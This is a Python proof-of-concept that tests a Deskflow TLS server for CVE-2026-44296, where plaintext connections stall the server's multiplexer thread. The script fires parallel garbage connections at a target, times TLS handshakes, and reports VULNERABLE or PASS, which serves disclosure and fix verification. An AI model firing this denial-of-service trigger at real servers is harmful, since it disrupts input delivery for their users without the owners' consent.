#!/usr/bin/env python3
"""
CVE-2026-44296 — Deskflow TLS server multiplexer stall on failed SSL_accept.

A plaintext TCP client whose first bytes aren't a valid TLS ClientHello drives
src/lib/net/SecureSocket.cpp::secureAccept into its `isFatal()` branch, which
calls `Arch::sleep(1)` (1.000 s) before returning. The caller is
SocketMultiplexer's lone worker thread that pumps EVERY socket on the server,
including established TLS clients delivering mouse motion. So one bad
plaintext connection stalls input delivery to all connected screens for ~1 s;
a steady drip produces the visible mouse stuttering reported in the field.

Log fingerprint on the server during the stall (1.000 s gap is the bug):

    ERROR: failed to accept secure socket           <- src/lib/net/SecureSocket.cpp:427
    WARNING: client connection may not be secure
    [exactly 1.000 s elapses here on the multiplexer thread]
    DEBUG: disconnected client before accept

This PoC quantifies the stall by timing how long a fresh, well-formed TLS
client takes to complete its TCP+TLS handshake and read the server's "Synergy"
hello packet — first quietly (baseline), then while N plaintext garbage
connections are firing in parallel. If the during-attack latency exceeds the
baseline by at least ~0.5 s per concurrent stall, the multiplexer is being
starved and the server is vulnerable. The fix is to make the SSL_accept
failure path non-blocking (drop the connection without sleeping the worker).
"""

import argparse
import socket
import ssl
import statistics
import struct
import sys
import threading
import time

from utils import create_ssl_socket, normalize_host

GARBAGE = b"GET / HTTP/1.0\r\nHost: deskflow\r\n\r\n"


def time_hello(host, port, timeout=30.0):
    t0 = time.monotonic()
    sock = create_ssl_socket(host, port, timeout=timeout)
    try:
        hdr = b""
        while len(hdr) < 4:
            chunk = sock.recv(4 - len(hdr))
            if not chunk:
                return None
            hdr += chunk
        size = struct.unpack(">I", hdr)[0]
        body = b""
        while len(body) < size:
            chunk = sock.recv(size - len(body))
            if not chunk:
                return None
            body += chunk
        if not body.startswith((b"Synergy", b"Barrier")):
            return None
        return time.monotonic() - t0
    finally:
        try:
            sock.close()
        except Exception:
            pass


def trigger_stall(host, port):
    try:
        s = socket.create_connection((host, port), timeout=5.0)
        try:
            s.sendall(GARBAGE)
        finally:
            s.close()
    except OSError:
        pass


def measure(host, port, samples, label):
    rtts = []
    for _ in range(samples):
        try:
            t = time_hello(host, port)
        except (OSError, ssl.SSLError) as e:
            print(f"  {label} sample failed: {e}")
            continue
        if t is not None:
            rtts.append(t)
            print(f"  {label} hello rtt: {t*1000:.0f} ms")
        time.sleep(0.3)
    return rtts


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=24800)
    ap.add_argument("--baseline-samples", type=int, default=3)
    ap.add_argument("--stalls", type=int, default=5,
                    help="number of plaintext garbage connections to fire in parallel")
    ap.add_argument("--during-samples", type=int, default=1,
                    help="number of TLS hello probes to run while the attack is in flight")
    args = ap.parse_args()

    host = normalize_host(args.host)

    print(f"CVE-2026-44296 — TLS multiplexer stall on failed SSL_accept")
    print(f"target: {host}:{args.port}  stalls: {args.stalls}\n")

    print("[*] collecting baseline hello rtt (no attack)")
    baseline = measure(host, args.port, args.baseline_samples, "baseline")
    if not baseline:
        print("[ERROR] could not collect a baseline — is the server reachable on tls?")
        return 2
    base_median = statistics.median(baseline)
    print(f"  baseline median: {base_median*1000:.0f} ms\n")

    print(f"[*] firing {args.stalls} plaintext garbage connections")
    threads = [threading.Thread(target=trigger_stall, args=(host, args.port), daemon=True)
               for _ in range(args.stalls)]
    for t in threads:
        t.start()
    time.sleep(0.05)

    print(f"[*] measuring hello rtt during attack")
    during = measure(host, args.port, args.during_samples, "attack")
    for t in threads:
        t.join(timeout=30.0)

    if not during:
        print("[FAIL] server stopped responding during attack — VULNERABLE (CVE-2026-44296)")
        return 1

    during_median = statistics.median(during)
    overhead = during_median - base_median
    floor = max(0.5, args.stalls * 0.5)
    print(f"\n  attack median: {during_median*1000:.0f} ms")
    print(f"  overhead:      {overhead*1000:.0f} ms (threshold {floor*1000:.0f} ms)")

    if overhead >= floor:
        print(f"[FAIL] multiplexer stalled by {overhead*1000:.0f} ms — VULNERABLE (CVE-2026-44296)")
        return 1

    print("[PASS] no significant multiplexer stall — fix appears in place")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
